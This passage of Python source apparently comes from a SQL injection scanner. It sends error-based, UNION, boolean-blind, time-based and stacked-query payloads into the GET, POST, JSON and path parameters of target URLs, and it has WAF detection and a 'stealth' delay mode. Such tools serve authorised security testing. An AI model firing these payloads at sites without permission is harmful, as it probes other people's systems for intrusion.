            # Doubled single-quote escape (for apps using addslashes improperly)
            "1'' AND extractvalue(0,concat(0x7e,'TEST',0x7e)) AND ''1''=''1",
        ]

        for payload in payloads:
            if self.circuit_breaker.is_dead(url):
                break
            if _exit_requested or _skip_current:
                break

            test_url = self._inject_payload(url, param_name, payload)
            response = self._get(test_url)
            if response is None:
                continue

            waf = self._detect_waf(response)
            if waf:
                result["waf"] = waf
                result["evidence"].append(f"WAF detected ({waf}): error-based skipped")
                break

            match = self._match_sql_errors(response.text)
            if match:
                db_type, pattern = match
                result["vulnerable"] = True
                # [FP-6] Generic SQL error signatures ("syntax error near",
                # "data type mismatch", etc.) can appear in framework errors,
                # JavaScript output, or ORM messages without any injection.
                # Cap their confidence at LOW and flag the risk.
                if db_type == "generic":
                    result["confidence"] = SQLiConfidence.LOW.value
                    result["evidence"].append(
                        f"GENERIC error signature matched: {pattern[:60]} — "
                        f"confidence capped at LOW (high FP risk; verify manually)"
                    )
                else:
                    result["confidence"] = SQLiConfidence.HIGH.value
                    result["evidence"].append(
                        f"{db_type.upper()} error signature matched: {pattern[:60]}"
                    )
                return result

            if self.stealth:
                _interruptible_sleep(random.uniform(1.5, 3))

        return result

    # ──────────────────────────────────────────────────────────
    #  [2] Union-based — [NEW-8] NULL + string column probing
    # ──────────────────────────────────────────────────────────

    def _test_union_based(self, url: str, param_name: str, baseline_len: int) -> Dict:
        """
        Probe UNION SELECT column counts and look for mismatch errors or
        abnormal response sizes.

        [NEW-8] Tests two column-type strategies per column count:
          - NULL columns  — works on most DB types
          - String columns ('a','b',...) — handles targets that reject NULL
            but accept string literals (seen on some Oracle/MSSQL setups)
        """
        result = {
            "method":     "union_based",
            "vulnerable": False,
            "confidence": SQLiConfidence.NONE.value,
            "evidence":   [],
            "waf":        None,
        }

        mismatch_at: List[int] = []
        string_cols  = lambda n: ",".join([f"'{'abcdefghij'[i % 10]}'" for i in range(n)])

        for n_cols in range(1, _UNION_COLUMNS_MAX + 1):
            if self.circuit_breaker.is_dead(url):
                break
            if _exit_requested or _skip_current:
                break

            null_cols = ",".join(["NULL"] * n_cols)
            str_cols  = string_cols(n_cols)

            # [NEW-8] Two payload groups: NULL and string-literal columns
            payloads = [
                # NULL-based
                f"' UNION SELECT {null_cols}--",
                f"' UNION SELECT {null_cols}#",
                f"-1 UNION SELECT {null_cols}--",
                f"0 UNION ALL SELECT {null_cols}--",
                # [NEW-8] String-literal columns
                f"' UNION SELECT {str_cols}--",
                f"-1 UNION SELECT {str_cols}--",
            ]

            for payload in payloads:
                if _exit_requested or _skip_current:
                    break

                test_url = self._inject_payload(url, param_name, payload)
                response = self._get(test_url)
                if response is None:
                    continue

                waf = self._detect_waf(response)
                if waf:
                    result["waf"] = waf
                    result["evidence"].append(
                        f"WAF detected ({waf}): UNION probe aborted at {n_cols} cols"
                    )
                    return result

                body = response.text

                if self._UNION_COL_MISMATCH_RE.search(body):
                    if n_cols not in mismatch_at:
                        mismatch_at.append(n_cols)
                        result["evidence"].append(
                            f"UNION col-mismatch at n={n_cols} — server processes UNION"
                        )
                    break

                sql_match = self._match_sql_errors(body)
                if sql_match:
                    db_type, pattern = sql_match
                    result["vulnerable"] = True
                    result["confidence"] = SQLiConfidence.HIGH.value
                    result["evidence"].append(
                        f"UNION triggered {db_type.upper()} error at n={n_cols}: "
                        f"{pattern[:50]}"
                    )
                    return result

                len_diff = abs(len(body) - baseline_len)
                if (response.status_code == 200
                        and len_diff > baseline_len * 0.20
                        and (n_cols in mismatch_at or bool(mismatch_at))):
                    result["vulnerable"] = True
                    result["confidence"] = SQLiConfidence.MEDIUM.value
                    result["evidence"].append(
                        f"UNION SELECT {n_cols} cols: response Δ={len_diff}B "
                        f"(prev mismatches at cols {mismatch_at})"
                    )
                    return result

                if self.stealth:
                    _interruptible_sleep(random.uniform(0.5, 1.5))

        if mismatch_at:
            result["vulnerable"] = True
            result["confidence"] = SQLiConfidence.LOW.value
            result["evidence"].append(
                f"UNION col-mismatch at col(s) {mismatch_at}: "
                f"UNION syntax processed by server"
            )

        return result

    # ──────────────────────────────────────────────────────────
    #  [3] Boolean blind — [NEW-4]+[NEW-5] dual metric + more pairs
    # ──────────────────────────────────────────────────────────

    def _test_boolean_blind(self, url: str, param_name: str, baseline_len: int,
                             baseline_content: str) -> Dict:
        """
        Send true/false boolean pairs and detect statistically significant differences.

        [NEW-4] Dual-metric false-positive reduction:
          Both conditions must hold to declare vulnerable:
          (a) median body-length differential > 15% of baseline
          (b) median content-similarity differential > 0.05 (5 percentage points)
          This prevents false positives on pages with natural size fluctuations
          where length changes but content structure stays the same.

        [NEW-5] Expanded from 4 to 8 payload pairs including DB-specific
          variants and comment-terminated forms.
        """
        result = {
            "method":     "boolean_blind",
            "vulnerable": False,
            "confidence": SQLiConfidence.NONE.value,
            "evidence":   [],
        }

        # [NEW-5] + [FP-3] Boolean payload pairs.
        # The original "OR 1=1 / OR 1=2" pair has been REMOVED: OR-based
        # payloads can legitimately expand the result set (returning more DB
        # rows) without any injection, producing length changes that are
        # indistinguishable from real SQLi signals.
        # Replacements use arithmetic-only conditions that evaluate in the
        # WHERE clause without adding rows: AND (1)=(1) vs AND (1)=(2), and
        # a CASE WHEN variant for backends that fold simple arithmetic.
        bool_payloads = [
            # Standard string-context pairs
            ("1' AND '1'='1",          "true"),
            ("1' AND '1'='2",          "false"),
            # Numeric context
            ("1 AND 1=1",              "true"),
            ("1 AND 1=2",              "false"),
            # Comment-terminated variants (handles parsers that need -- to close)
            ("1' AND 1=1--",           "true"),
            ("1' AND 1=2--",           "false"),
            # [FP-3] Parenthesized arithmetic — no row-set expansion, safe replacement
            # for the removed OR pair; CASE WHEN handles backends that optimize away
            # simple integer comparisons
            ("1 AND (1)=(1)",          "true"),
            ("1 AND (1)=(2)",          "false"),
            ("1 AND CASE WHEN 1=1 THEN 1 ELSE 0 END=1", "true"),
            ("1 AND CASE WHEN 1=2 THEN 1 ELSE 0 END=1", "false"),
        ]

        true_lengths:    List[int]   = []
        false_lengths:   List[int]   = []
        true_sims:       List[float] = []
        false_sims:      List[float] = []

        for payload, payload_type in bool_payloads:
            if self.circuit_breaker.is_dead(url):
                break
            if _exit_requested or _skip_current:
                break

            test_url = self._inject_payload(url, param_name, payload)
            sample_lengths: List[int]   = []
            sample_sims:    List[float] = []

            for _ in range(_BOOL_SAMPLES):
                if _exit_requested or _skip_current:
                    break
                r = self._get(test_url)
                if r is not None:
                    sample_lengths.append(len(r.text))
                    # [NEW-4] Also compute similarity ratio (sampled)
                    b1  = baseline_content[: _PROBE_SAMPLE_BYTES]
                    b2  = r.text[: _PROBE_SAMPLE_BYTES]
                    sim = difflib.SequenceMatcher(None, b1, b2).ratio()
                    sample_sims.append(sim)
                if self.stealth:
                    _interruptible_sleep(random.uniform(0.5, 1))

            if len(sample_lengths) >= 1:
                if payload_type == "true":
                    true_lengths.extend(sample_lengths)
                    true_sims.extend(sample_sims)
                else:
                    false_lengths.extend(sample_lengths)
                    false_sims.extend(sample_sims)

            if self.stealth:
                _interruptible_sleep(random.uniform(1, 2))

        if not true_lengths or not false_lengths:
            return result

        median_true_len   = statistics.median(true_lengths)
        median_false_len  = statistics.median(false_lengths)
        len_diff          = abs(median_true_len - median_false_len)

        # [NEW-4] Similarity differential
        median_true_sim   = statistics.median(true_sims)  if true_sims  else 1.0
        median_false_sim  = statistics.median(false_sims) if false_sims else 1.0
        sim_diff          = abs(median_true_sim - median_false_sim)

        # Noise ceiling from internal variance
        all_true   = true_lengths
        all_false  = false_lengths
        iv_true    = max(all_true)  - min(all_true)
        iv_false   = max(all_false) - min(all_false)
        noise_ceil = baseline_len * 0.04

        # [NEW-4] Both metrics must exceed thresholds
        len_condition = (
            len_diff > baseline_len * 0.15
            and iv_true  < noise_ceil
            and iv_false < noise_ceil
        )
        sim_condition = sim_diff > 0.05  # 5 percentage points

        if len_condition and sim_condition:
            # ── [FP-4] Triple-confirmation ────────────────────────────────────
            # Re-send the first valid true/false pair two more times and check
            # that the signal is reproducible. A single network fluctuation or
            # CDN cache miss can produce a one-off length change that passes
            # dual-metric. Two consistent rounds = confirmed; any inconsistency
            # = downgrade to LOW.
            confirm_ok = True
            first_true_payload  = next(
                (p for p, t in bool_payloads if t == "true"), "1 AND 1=1"
            )
            first_false_payload = next(
                (p for p, t in bool_payloads if t == "false"), "1 AND 1=2"
            )
            confirm_true_lens:  List[int] = []
            confirm_false_lens: List[int] = []

            for _ in range(2):
                if _exit_requested or _skip_current:
                    confirm_ok = False
                    break
                rt = self._get(self._inject_payload(url, param_name, first_true_payload))
                rf = self._get(self._inject_payload(url, param_name, first_false_payload))
                if rt is None or rf is None:
                    confirm_ok = False
                    break
                confirm_true_lens.append(len(rt.text))
                confirm_false_lens.append(len(rf.text))
                _interruptible_sleep(0.4)

            if confirm_ok and confirm_true_lens and confirm_false_lens:
                confirm_len_diff = abs(
                    statistics.median(confirm_true_lens) -
                    statistics.median(confirm_false_lens)
                )
                if confirm_len_diff > baseline_len * 0.10:
                    result["vulnerable"] = True
                    result["confidence"] = SQLiConfidence.MEDIUM.value
                    result["evidence"].append(
                        f"Boolean dual-metric + triple-confirm: "
                        f"len TRUE={median_true_len:.0f}B  FALSE={median_false_len:.0f}B  "
                        f"Δlen={len_diff:.0f}B  sim_diff={sim_diff:.3f}  "
                        f"confirm_Δ={confirm_len_diff:.0f}B  "
                        f"iv_t={iv_true:.0f}B  iv_f={iv_false:.0f}B"
                    )
                else:
                    # Triple-confirm failed → downgrade
                    result["vulnerable"] = True
                    result["confidence"] = SQLiConfidence.LOW.value
                    result["evidence"].append(
                        f"Boolean dual-metric PASSED but triple-confirm FAILED "
                        f"(confirm_Δ={confirm_len_diff:.0f}B < 10% baseline) — "
                        f"downgraded to LOW; likely dynamic-page FP"
                    )
            else:
                result["vulnerable"] = True
                result["confidence"] = SQLiConfidence.LOW.value
                result["evidence"].append(
                    "Boolean dual-metric passed; triple-confirm inconclusive "
                    "(network error during re-check) — LOW confidence"
                )

        elif len_condition:
            # Length passed but similarity did not — LOW confidence only
            result["vulnerable"] = True
            result["confidence"] = SQLiConfidence.LOW.value
            result["evidence"].append(
                f"Boolean length differential only (sim_diff={sim_diff:.3f} "
                f"below threshold): "
                f"Δlen={len_diff:.0f}B — treat as LOW confidence"
            )

        return result

    # ──────────────────────────────────────────────────────────
    #  [4] Time-based blind — [NEW-3] DB-specific payloads
    # ──────────────────────────────────────────────────────────

    def _test_time_based_blind(self, url: str, param_name: str) -> Dict:
        """
        Inject SLEEP payloads and detect delays as time-based blind SQLi.

        [NEW-3] DB-specific payload set instead of MySQL-only:
          - MySQL/MariaDB: SLEEP()
          - PostgreSQL:    pg_sleep()
          - MSSQL:         WAITFOR DELAY
          - Oracle:        heavy UTL_HTTP / dbms_pipe query (no native sleep)
          - SQLite:        heavy cross-join query
        Each group is tried independently; the first confirmed hit returns.
        """
        result = {
            "method":     "time_based_blind",
            "vulnerable": False,
            "confidence": SQLiConfidence.NONE.value,
            "evidence":   [],
        }

        baseline = self._measure_baseline_latency(url)
        if baseline is None:
            result["evidence"].append(
                "Skipped: host unreachable or baseline latency too high"
            )
            return result

        threshold  = baseline + _SLEEP_DELAY + _TIMEBASED_MARGIN
        extra_read = _SLEEP_DELAY + _TIMEBASED_MARGIN + 3

        # [NEW-3] DB-specific sleep payloads
        sleep_payloads_groups = [
            # MySQL / MariaDB
            [
                f"1' AND SLEEP({_SLEEP_DELAY}) AND '1'='1",
                f"1 AND SLEEP({_SLEEP_DELAY})",
                f"1' OR SLEEP({_SLEEP_DELAY})--",
            ],
            # PostgreSQL
            [
                f"1' AND pg_sleep({_SLEEP_DELAY})--",
                f"1; SELECT pg_sleep({_SLEEP_DELAY})--",
                f"1' OR pg_sleep({_SLEEP_DELAY})--",
            ],
            # MSSQL
            [
                f"1'; WAITFOR DELAY '0:0:{_SLEEP_DELAY}'--",
                f"1 WAITFOR DELAY '0:0:{_SLEEP_DELAY}'--",
                f"1' OR 1=1; WAITFOR DELAY '0:0:{_SLEEP_DELAY}'--",
            ],
            # Oracle — no native sleep; use heavy recursive query as fallback
            [
                "1' AND 1=(SELECT COUNT(*) FROM ALL_OBJECTS,ALL_OBJECTS,ALL_OBJECTS "
                "WHERE ROWNUM<10)--",
            ],
            # SQLite — heavy cross join
            [
                "1 AND (SELECT COUNT(*) FROM "
                "sqlite_master,sqlite_master,sqlite_master) AND 1=1",
            ],
        ]

        neutral_payload = "1' AND '1'='1"

        for sleep_group in sleep_payloads_groups:
            if self.circuit_breaker.is_dead(url) or _exit_requested or _skip_current:
                break

            for sleep_payload in sleep_group:
                if self.circuit_breaker.is_dead(url) or _exit_requested or _skip_current:
                    break

                test_url = self._inject_payload(url, param_name, sleep_payload)
                t0       = time.monotonic()
                response = self._get(test_url, extra_read=extra_read)
                elapsed  = time.monotonic() - t0

                sleep_triggered = False
                if response is None and elapsed >= threshold * 0.9:
                    sleep_triggered = True
                elif response is not None and elapsed >= threshold:
                    sleep_triggered = True

                if not sleep_triggered:
                    continue

                if response is not None:
                    waf = self._detect_waf(response)
                    if waf:
                        result["evidence"].append(
                            f"WAF detected ({waf}): time-based latency may be "
                            f"firewall delay"
                        )
                        continue

                # Confirm with neutral requests
                neutral_url    = self._inject_payload(url, param_name, neutral_payload)
                confirm_times: List[float] = []
                confirm_fails  = 0

                for _ in range(_TIMEBASED_CONFIRM):
                    if self.circuit_breaker.is_dead(url) or _exit_requested or _skip_current:
                        break
                    t_c       = time.monotonic()
                    r_c       = self._get(neutral_url)
                    elapsed_c = time.monotonic() - t_c

                    if r_c is None:
                        confirm_fails += 1
                    else:
                        confirm_times.append(elapsed_c)

                    _interruptible_sleep(0.5)

                if confirm_fails > 0 or not confirm_times:
                    continue

                confirm_avg       = sum(confirm_times) / len(confirm_times)
                confirm_threshold = baseline + _TIMEBASED_MARGIN

                if confirm_avg <= confirm_threshold:
                    # ── [FP-5] Double-SLEEP confirmation ─────────────────────
                    # Re-send the sleep payload ONE more time. A single network
                    # spike can delay a response without any SQLi. If the second
                    # hit also exceeds the threshold → HIGH confidence.
                    # If not → discard the finding (spike eliminated as FP).
                    t_recheck  = time.monotonic()
                    r_recheck  = self._get(test_url, extra_read=extra_read)
                    el_recheck = time.monotonic() - t_recheck

                    recheck_triggered = (
                        (r_recheck is None and el_recheck >= threshold * 0.9)
                        or (r_recheck is not None and el_recheck >= threshold)
                    )

                    if not recheck_triggered:
                        result["evidence"].append(
                            f"[FP-guard] Time-based: first hit elapsed={elapsed:.1f}s "
                            f"confirmed neutral but SLEEP re-check did NOT trigger "
                            f"(recheck={el_recheck:.1f}s) — discarded as network spike"
                        )
                        continue   # don't declare vulnerable

                    result["vulnerable"] = True
                    result["confidence"] = SQLiConfidence.HIGH.value
                    result["evidence"].append(
                        f"Time-based double-confirmed: "
                        f"payload=[{sleep_payload[:50]}]  "
                        f"hit1={elapsed:.1f}s  hit2={el_recheck:.1f}s  "
                        f"threshold={threshold:.1f}s  "
                        f"neutral={confirm_avg:.2f}s  baseline={baseline:.2f}s"
                    )
                    return result

        return result

    # ──────────────────────────────────────────────────────────
    #  [5] Stacked-query probe — [NEW-6]
    # ──────────────────────────────────────────────────────────

    def _test_stacked_query(self, url: str, param_name: str,
                             baseline_content: str) -> Dict:
        """
        Lightweight probe for stacked-query (multiple statements) support.

        [NEW-6] Sends ";" separator payloads that insert a harmless second
        statement (SELECT NULL / SELECT 1). Detects:
          - SQL error signatures in the response (confirms stacking)
          - Significant response-content change vs baseline (state change)
          - Status-code anomalies (some servers error on stacked queries)

        Confidence is capped at LOW because stacked-query support alone does
        not confirm exploitability — it signals that further manual testing
        is warranted.
        """
        result = {
            "method":     "stacked_query",
            "vulnerable": False,
            "confidence": SQLiConfidence.NONE.value,
            "evidence":   [],
        }

        stacked_payloads = [
            "1'; SELECT NULL--",
            "1'; SELECT NULL#",
            "1'; SELECT 1--",
            "1'; WAITFOR DELAY '0:0:0'--",   # MSSQL — zero delay, just stacking test
            "1'; SELECT pg_sleep(0)--",       # PostgreSQL — zero delay
            "1'; SELECT NULL FROM dual--",    # Oracle
            "1'; SELECT NULL FROM sqlite_master--",  # SQLite
        ]

        for payload in stacked_payloads:
            if self.circuit_breaker.is_dead(url):
                break
            if _exit_requested or _skip_current:
                break

            test_url = self._inject_payload(url, param_name, payload)
            response = self._get(test_url)
            if response is None:
                continue

            waf = self._detect_waf(response)
            if waf:
                result["evidence"].append(
                    f"WAF detected ({waf}): stacked probe blocked"
                )
                break

            # Signal 1 — SQL error signature
            match = self._match_sql_errors(response.text)
            if match:
                db_type, pattern = match
                result["vulnerable"] = True
                result["confidence"] = SQLiConfidence.LOW.value
                result["evidence"].append(
                    f"Stacked query triggered {db_type.upper()} error: "
                    f"{pattern[:60]} — payload: {payload[:50]}"
                )
                return result

            # Signal 2 — significant content change vs baseline
            b1  = baseline_content[: _PROBE_SAMPLE_BYTES]
            b2  = response.text[: _PROBE_SAMPLE_BYTES]
            sim = difflib.SequenceMatcher(None, b1, b2).ratio()
            if sim < 0.80:
                result["vulnerable"] = True
                result["confidence"] = SQLiConfidence.LOW.value
                result["evidence"].append(
                    f"Stacked query caused significant content change "
                    f"(similarity={sim:.2f}): payload: {payload[:50]}"
                )
                return result

            if self.stealth:
                _interruptible_sleep(random.uniform(1.0, 2.0))

        return result

    # ──────────────────────────────────────────────────────────
    #  Main GET entry point
    # ──────────────────────────────────────────────────────────

    def test_sqli(self, url: str) -> Dict:
        """Run the full GET-parameter SQLi test suite on url."""
        result = {
            "url":                url,
            "vulnerable":         False,
            "overall_confidence": SQLiConfidence.NONE.value,
            "tests":              [],
            "tested":             False,
            "message":            "",
            "waf_detected":       None,
        }

        if not self.has_query_params(url):
            result["message"] = "No query parameters found"
            return result

        if self.circuit_breaker.is_dead(url):
            result["message"] = "Host unreachable (circuit breaker open)"
            return result

        result["tested"] = True
        params = self._extract_query_params(url)
        if not params:
            result["message"] = "No query parameters found"
            return result

        baseline = self._get_baseline_response(url)
        if baseline is None:
            result["message"] = "Could not establish baseline (host unreachable)"
            return result

        baseline_status, baseline_content, baseline_len = baseline

        _bl2 = self._get(url)
        if _bl2 is not None:
            waf_on_baseline = self._detect_waf(_bl2)
            if waf_on_baseline:
                result["waf_detected"] = waf_on_baseline
                result["message"] = (
                    f"WAF detected ({waf_on_baseline}) on baseline — "
                    f"results may have false negatives"
                )

        per_param_scores: List[int] = []

        # ── [FP-1] Page-stability pre-check ──────────────────────────────────
        # Measure how stable the page is between two clean requests.
        # Boolean-blind is skipped per-param if stability < _PAGE_STABILITY_MIN
        # because dynamic content (ads, rotating feeds, timestamps) produces
        # natural length/similarity changes that perfectly mimic blind SQLi.
        _page_stability = self._check_page_stability(url)
        _boolean_allowed = _page_stability >= _PAGE_STABILITY_MIN

        for param_name in self._prioritize_params(params):
            if self.circuit_breaker.is_dead(url):
                result["message"] = "Host became unreachable during testing"
                break
            if _exit_requested or _skip_current:
                break
            if not self._probe_parameter(url, param_name, baseline_content):
                continue

            param_score = 0

            # ── Error-based ───────────────────────────────────────────────────
            error_result = self._test_error_based(url, param_name)
            error_result["parameter"] = param_name
            result["tests"].append(error_result)

            if error_result.get("waf") and not result["waf_detected"]:
                result["waf_detected"] = error_result["waf"]

            if error_result["vulnerable"]:
                if error_result["confidence"] == SQLiConfidence.HIGH.value:
                    param_score += 3
                    result["vulnerable"]         = True
                    result["overall_confidence"] = SQLiConfidence.HIGH.value
                    result["message"]            = f"Tested {len(params)} parameter(s)"
                    return result
                else:
                    param_score += 2

            # ── Union-based ───────────────────────────────────────────────────
            union_result = self._test_union_based(url, param_name, baseline_len)
            union_result["parameter"] = param_name
            result["tests"].append(union_result)

            if union_result.get("waf") and not result["waf_detected"]:
                result["waf_detected"] = union_result["waf"]

            if union_result["vulnerable"]:
                if union_result["confidence"] == SQLiConfidence.HIGH.value:
                    param_score += 3
                elif union_result["confidence"] == SQLiConfidence.MEDIUM.value:
                    param_score += 2
                else:
                    param_score += 1

            # ── Boolean blind ─────────────────────────────────────────────────
            # [FP-1] Skip boolean blind on dynamically unstable pages to avoid
            # false positives from natural page variation.
            if _boolean_allowed:
                # [NEW-4] Pass baseline_content for similarity-ratio metric
                bool_result = self._test_boolean_blind(
                    url, param_name, baseline_len, baseline_content
                )
            else:
                bool_result = {
                    "method":     "boolean_blind",
                    "vulnerable": False,
                    "confidence": SQLiConfidence.NONE.value,
                    "evidence":   [
                        f"[FP-guard] Boolean blind skipped — page stability "
                        f"{_page_stability:.2f} < threshold {_PAGE_STABILITY_MIN} "
                        f"(dynamic content would cause false positives)"
                    ],
                }
            bool_result["parameter"] = param_name
            result["tests"].append(bool_result)
            if bool_result["vulnerable"]:
                if bool_result["confidence"] == SQLiConfidence.MEDIUM.value:
                    param_score += 2
                else:
                    param_score += 1  # LOW

            # ── Time-based ────────────────────────────────────────────────────
            time_result = self._test_time_based_blind(url, param_name)
            time_result["parameter"] = param_name
            result["tests"].append(time_result)
            if time_result.get("vulnerable", False):
                param_score += (
                    3 if time_result["confidence"] == SQLiConfidence.HIGH.value else 2
                )

            # ── [NEW-6] Stacked-query probe ───────────────────────────────────
            stacked_result = self._test_stacked_query(url, param_name, baseline_content)
            stacked_result["parameter"] = param_name
            result["tests"].append(stacked_result)
            if stacked_result["vulnerable"]:
                param_score += 1  # LOW confidence signal only

            if param_score > 0:
                per_param_scores.append(param_score)

            if self.stealth:
                _interruptible_sleep(random.uniform(2, 4))

        if per_param_scores:
            best = max(per_param_scores)
            avg  = sum(per_param_scores) / len(per_param_scores)

            result["vulnerable"] = True

            if best >= 5:
                result["overall_confidence"] = SQLiConfidence.CRITICAL.value
            elif best >= 3 or avg >= 3:
                result["overall_confidence"] = SQLiConfidence.HIGH.value
            elif best >= 2 or avg >= 2:
                result["overall_confidence"] = SQLiConfidence.MEDIUM.value
            else:
                result["overall_confidence"] = SQLiConfidence.LOW.value

        result["message"] = f"Tested {len(params)} parameter(s)"
        return result

    # ──────────────────────────────────────────────────────────
    #  POST entry point — [NEW-9] multi-method
    # ──────────────────────────────────────────────────────────

    def test_post_sqli(self, url: str, post_data: Dict[str, str]) -> Dict:
        """
        Test POST parameters for SQL injection.

        [NEW-9] Promoted from error-only to error + time-based, matching
        the GET-parameter coverage. Boolean/union not included here because
        POST semantics (non-idempotent, possible side effects) make repeated
        differential requests inadvisable without explicit authorisation.
        """
        result = {
            "url":                url,
            "vulnerable":         False,
            "overall_confidence": SQLiConfidence.NONE.value,
            "tests":              [],
            "tested":             False,
            "message":            "",
            "waf_detected":       None,
        }
        if not post_data or self.circuit_breaker.is_dead(url):
            result["message"] = "No POST parameters or host unreachable"
            return result

        result["tested"]  = True
        baseline_resp     = self._get(url)
        if baseline_resp is None:
            result["message"] = "Could not establish baseline"
            return result

        waf = self._detect_waf(baseline_resp)
        if waf:
            result["waf_detected"] = waf

        baseline_lat = self._measure_baseline_latency(url)
        confidence_scores: List[int] = []

        for param_name in self._prioritize_params(post_data):
            if self.circuit_breaker.is_dead(url):
                break
            if _exit_requested or _skip_current:
                break

            # ── Error-based ───────────────────────────────────────────────────
            payload_dict             = dict(post_data)
            payload_dict[param_name] = str(post_data[param_name]) + "'"

            response = self._post(url, data=payload_dict)
            if response is None:
                if self.circuit_breaker.is_dead(url):
                    break
                continue

            waf = self._detect_waf(response)
            if waf:
                if not result["waf_detected"]:
                    result["waf_detected"] = waf
                continue

            match = self._match_sql_errors(response.text)
            if match:
                db_type, pattern = match
                result["vulnerable"] = True
                result["tests"].append({
                    "method":    "post_error_based",
                    "parameter": param_name,
                    "db":        db_type,
                    "evidence":  pattern[:60],
                })
                confidence_scores.append(3)

            # ── [NEW-9] Time-based (POST) ─────────────────────────────────────
            if baseline_lat is not None:
                threshold  = baseline_lat + _SLEEP_DELAY + _TIMEBASED_MARGIN
                extra_read = _SLEEP_DELAY + _TIMEBASED_MARGIN + 3

                for sleep_payload in [
                    f"' AND SLEEP({_SLEEP_DELAY}) AND '1'='1",
                    f"'; WAITFOR DELAY '0:0:{_SLEEP_DELAY}'--",
                    f"' AND pg_sleep({_SLEEP_DELAY})--",
                ]:
                    if _exit_requested or _skip_current:
                        break
                    timed_data             = dict(post_data)
                    timed_data[param_name] = str(post_data[param_name]) + sleep_payload

                    t0       = time.monotonic()
                    resp_t   = self._post(url, data=timed_data)
                    elapsed  = time.monotonic() - t0

                    triggered = (
                        (resp_t is None and elapsed >= threshold * 0.9)
                        or (resp_t is not None and elapsed >= threshold)
                    )

                    if triggered:
                        if resp_t and self._detect_waf(resp_t):
                            continue
                        result["vulnerable"] = True
                        result["tests"].append({
                            "method":    "post_time_based",
                            "parameter": param_name,
                            "evidence":  (
                                f"POST time-based: elapsed={elapsed:.1f}s "
                                f"threshold={threshold:.1f}s "
                                f"payload={sleep_payload[:40]}"
                            ),
                        })
                        confidence_scores.append(2)
                        break

            if self.stealth:
                _interruptible_sleep(random.uniform(2, 4))

        if confidence_scores:
            avg = sum(confidence_scores) / len(confidence_scores)
            best = max(confidence_scores)
            result["overall_confidence"] = (
                SQLiConfidence.HIGH.value   if best >= 3 else
                SQLiConfidence.MEDIUM.value if avg  >= 2 else
                SQLiConfidence.LOW.value
            )
            result["vulnerable"] = True

        result["message"] = f"Tested {len(post_data)} POST parameter(s)"
        return result

    # ──────────────────────────────────────────────────────────
    #  JSON entry point — [NEW-9] multi-method
    # ──────────────────────────────────────────────────────────

    def test_json_sqli(self, url: str, json_data: Dict[str, str]) -> Dict:
        """
        Test JSON body parameters for SQL injection.

        [NEW-9] Promoted from error-only to error + time-based.
        """
        result = {
            "url":                url,
            "vulnerable":         False,
            "overall_confidence": SQLiConfidence.NONE.value,
            "tests":              [],
            "tested":             False,
            "message":            "",
            "waf_detected":       None,
        }
        if not json_data or self.circuit_breaker.is_dead(url):
            result["message"] = "No JSON parameters or host unreachable"
            return result

        result["tested"]  = True
        baseline_lat      = self._measure_baseline_latency(url)
        confidence_scores: List[int] = []

        for key in json_data.keys():
            if self.circuit_breaker.is_dead(url):
                break
            if _exit_requested or _skip_current:
                break

            # ── Error-based ───────────────────────────────────────────────────
            payload_dict      = dict(json_data)
            payload_dict[key] = str(payload_dict[key]) + "'"

            response = self._post(url, json_body=payload_dict)
            if response is None:
                continue

            waf = self._detect_waf(response)
            if waf:
                if not result["waf_detected"]:
                    result["waf_detected"] = waf
                continue

            match = self._match_sql_errors(response.text)
            if match:
                db_type, pattern = match
                result["vulnerable"] = True
                result["tests"].append({
                    "method":    "json_error_based",
                    "parameter": key,
                    "db":        db_type,
                    "evidence":  pattern[:60],
                })
                confidence_scores.append(3)

            # ── [NEW-9] Time-based (JSON) ─────────────────────────────────────
            if baseline_lat is not None:
                threshold  = baseline_lat + _SLEEP_DELAY + _TIMEBASED_MARGIN
                extra_read = _SLEEP_DELAY + _TIMEBASED_MARGIN + 3

                for sleep_payload in [
                    f"' AND SLEEP({_SLEEP_DELAY}) AND '1'='1",
                    f"'; WAITFOR DELAY '0:0:{_SLEEP_DELAY}'--",
                    f"' AND pg_sleep({_SLEEP_DELAY})--",
                ]:
                    if _exit_requested or _skip_current:
                        break
                    timed_json      = dict(json_data)
                    timed_json[key] = str(json_data[key]) + sleep_payload

                    t0      = time.monotonic()
                    resp_t  = self._post(url, json_body=timed_json)
                    elapsed = time.monotonic() - t0

                    triggered = (
                        (resp_t is None and elapsed >= threshold * 0.9)
                        or (resp_t is not None and elapsed >= threshold)
                    )

                    if triggered:
                        if resp_t and self._detect_waf(resp_t):
                            continue
                        result["vulnerable"] = True
                        result["tests"].append({
                            "method":    "json_time_based",
                            "parameter": key,
                            "evidence":  (
                                f"JSON time-based: elapsed={elapsed:.1f}s "
                                f"threshold={threshold:.1f}s"
                            ),
                        })
                        confidence_scores.append(2)
                        break

            if self.stealth:
                _interruptible_sleep(random.uniform(2, 4))

        if confidence_scores:
            best = max(confidence_scores)
            avg  = sum(confidence_scores) / len(confidence_scores)
            result["overall_confidence"] = (
                SQLiConfidence.HIGH.value   if best >= 3 else
                SQLiConfidence.MEDIUM.value if avg  >= 2 else
                SQLiConfidence.LOW.value
            )
            result["vulnerable"] = True

        result["message"] = "JSON injection test completed"
        return result

    # ──────────────────────────────────────────────────────────
    #  Path-based entry point
    # ──────────────────────────────────────────────────────────

    def test_path_based_sqli(self, url: str) -> Dict:
        """Test path-based SQLi by appending a quote to numeric/word path segments."""
        result = {
            "method":     "path_based",
            "vulnerable": False,
            "confidence": SQLiConfidence.NONE.value,
            "evidence":   [],
        }
        if self.circuit_breaker.is_dead(url):
            return result

        path = urlparse(url).path
        if re.search(r"/\d+$", path) or re.search(r"/\w+$", path):
            response = self._get(url + "'")
            if response:
                waf = self._detect_waf(response)
                if waf:
                    result["evidence"].append(f"WAF detected ({waf}): path-based skipped")
                    return result

                match = self._match_sql_errors(response.text)
                if match:
                    db_type, pattern = match
                    result["vulnerable"] = True
                    result["confidence"] = SQLiConfidence.HIGH.value
                    result["evidence"].append(
                        f"Path-based SQLi: {db_type.upper()} — {pattern[:60]}"
                    )
        return result
